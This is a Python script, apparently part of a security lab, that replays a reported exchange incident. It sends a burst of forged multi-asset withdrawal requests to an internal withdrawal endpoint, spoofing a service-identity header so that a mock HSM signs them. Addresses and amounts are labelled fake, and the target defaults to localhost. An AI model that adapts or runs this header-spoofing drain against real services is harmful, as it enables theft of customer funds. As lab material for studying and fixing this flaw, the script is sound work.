#!/usr/bin/env python3
"""
Phase 2 – Educational multi-asset burst of forged internal withdrawals.
Simulates the high-velocity multi-chain drain reported in the Oct 2026 incident.
All amounts and addresses are fake.
"""
import argparse
import json
import time
import urllib.request
import urllib.error

# Educational scale – not real values
BURST = [
    {"amount": "1.25",   "asset": "BTC",  "to": "bc1qattacker-demo-btc-001",  "user_id": "hotwallet-1"},
    {"amount": "45.0",   "asset": "ETH",  "to": "0xattackerDemoEth001",       "user_id": "hotwallet-2"},
    {"amount": "850000", "asset": "USDT", "to": "TAttackerDemoUsdt001",       "user_id": "hotwallet-3"},
    {"amount": "420000", "asset": "USDC", "to": "0xattackerDemoUsdc001",      "user_id": "hotwallet-4"},
    {"amount": "12.5",   "asset": "ETH",  "to": "0xattackerDemoEth002",       "user_id": "hotwallet-5"},
    {"amount": "0.8",    "asset": "BTC",  "to": "bc1qattacker-demo-btc-002",  "user_id": "hotwallet-6"},
]


def post(url: str, body: dict, headers: dict) -> tuple[int, str]:
    data = json.dumps(body).encode()
    req = urllib.request.Request(
        url,
        data=data,
        headers={"Content-Type": "application/json", **headers},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=8) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()


def main():
    p = argparse.ArgumentParser(description="Educational forged withdrawal burst")
    p.add_argument("--target", default="http://127.0.0.1:8081/internal/withdraw")
    p.add_argument("--delay", type=float, default=0.4, help="seconds between requests")
    args = p.parse_args()

    headers = {"X-Service-Identity": "withdrawal-service"}

    print("[*] Phase 2: Forging multi-asset burst (simulating short high-velocity window)")
    print(f"    target = {args.target}")
    print()

    success = 0
    for i, body in enumerate(BURST, 1):
        print(f"[{i}/{len(BURST)}] {body['asset']:4s} {body['amount']:>10s} → {body['to'][:28]}...")
        status, resp = post(args.target, body, headers)
        if status == 200:
            print(f"         [+] HTTP {status} – signed")
            success += 1
        else:
            print(f"         [-] HTTP {status}: {resp[:120]}")
        time.sleep(args.delay)

    print()
    print(f"[*] Burst complete: {success}/{len(BURST)} requests auto-signed by HSM mock")
    print("[!] This succeeded only because the HSM trusted the service-identity header.")
    print("    See LAB-NOTES.md for the corresponding hardened-path behaviour.")


if __name__ == "__main__":
    main()
